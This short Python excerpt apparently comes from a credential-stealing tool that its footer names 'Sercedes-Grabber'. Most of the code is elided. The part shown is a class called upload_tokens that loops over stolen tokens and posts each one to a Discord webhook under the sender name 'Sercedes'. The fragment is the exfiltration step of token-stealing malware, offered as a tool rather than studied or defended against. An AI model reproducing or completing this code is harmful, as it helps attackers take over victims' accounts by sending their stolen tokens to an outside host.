...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="https://github.com/Sercedes001/Sercedes-Grabber")

            self.webhook.send(embed=embed, username="Sercedes", avatar_url="https://cdn.discordapp.com/attachments/1062070879418318929/1062071822138491033/SERCEDES_LOGO1.png")
